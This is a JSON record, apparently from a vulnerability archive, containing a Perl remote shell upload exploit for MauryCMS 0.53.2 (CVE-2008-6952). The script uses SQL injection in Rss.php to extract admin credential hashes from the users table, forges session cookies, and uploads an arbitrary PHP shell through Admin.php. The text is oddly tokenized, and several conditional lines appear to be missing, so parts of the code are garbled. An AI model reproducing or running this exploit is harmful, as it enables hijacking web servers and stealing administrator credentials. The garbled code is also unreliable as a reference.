{
    "text": "vul_name : MauryCMS <= 0.53.2 Remote Shell Upload Exploit ， vul_cve : CVE-2008-6952 ， vul_poc :  #  ! /usr/bin/perl ， =about ， MauryCMS <= 0.53.2 Remote Shell Upload Exploit ， by athos - staker [ at ] hotmail [ dot ] it ， download on ， thnx Osirys ， =cut ， use strict ;  ， use warnings ;  ， use LWP : UserAgent ;  ， my (  $ http ,  $ post ,  $ user ,  $ pass ,  @ auth ,  @ read ,  $ shell )  ;  ， my $ host = shift @ ARGV ;  ， my $ file = shift @ ARGV or &usage ;  ， open ( FILE ,  $ file ) or die ( \"file error ! \\n\" )  ;  ，  @ read = <FILE> ;  ， foreach (  @ read )  ， { ，  $ shell .= $ _ ;  ， } ， close ( FILE )  ;  ， &usage if $ host !  ~ /http : \\/\\/ ( .+? )  $ /i $ file !  ~ / [ a-zA-Z ]  ( \\.php ) /i ;  ， my @ path = split /\\/ , substr (  $ host , 7 )  ;  ，  $ http = new LWP : UserAgent (  ， agent => \"Mozilla/4.5 [ en ]  ( Win95 ; U ) \" ,  ，  )  ;  ，  @ auth = split ( ' : ' , get_cookies (  )  ;  ， { ，  $ user = qq{_nick= $ {auth [ 1 ] } ; path=/ ; } ;  ，  $ pass = qq{_sauth= $ {auth [ 0 ] } ; path=/ ; } ;  ， } ， { ，  $ user = qq{/ $ {path [ 1 ] }_nick= $ {auth [ 1 ] } ; path=/ ; } ;  ，  $ pass = qq{/ $ {path [ 1 ] }_sauth= $ {auth [ 0 ] } ; path=/ ; } ;  ， } ，  $ http->default_header ( 'Cookie' => $ user. $ pass )  ;  ，  $ post = $ http->post (  $ host.'/Admin.php' ,  [  ， 'zone' => 'Modify' ,  ， 'txtfname' => $ file ,  ， 'txttext' => $ shell ,  ，  ]  )  ;  ， { ， print STDOUT \"Exploit Successfully ! \\n\" ;  ， print STDOUT \" $ host/ $ file\\n\" ;  ， exit ;  ， } ， { ， print STDOUT \"Exploit Failed ! \\n\" ;  ， exit ;  ， } ， sub get_cookies ， { ， my (  $ query ,  $ cookie ,  $ content )  ;  ，  $ query = \"/Rss.php?c=-1+union+select+1 , concat ( sauth , 0x3a , nick )  , \". ， \"3 , 4 , 5 , 6 , 7 , 8 , 9+from+mcms_users+where+id=1-\" ;  ，  $ cookie = $ http->get (  $ host. $ query )  ;  ，  $ content = $ cookie->content ;  ， { ， } ， } ， sub usage ， { ， print STDOUT \"MauryCMS <= 0.53.2 Remote Shell Upload Exploit\\n\". ， \"by athos - staker [ at ] hotmail [ dot ] it\\n\". ， \"-\\n\". ， \"Usage : perl $ 0 [ name_shell.php ] \\n\". ， \"Usage : perl $ 0 shell.php\\n\" ;  ， exit ;  ， }",
    "time": "2009.08.14"
}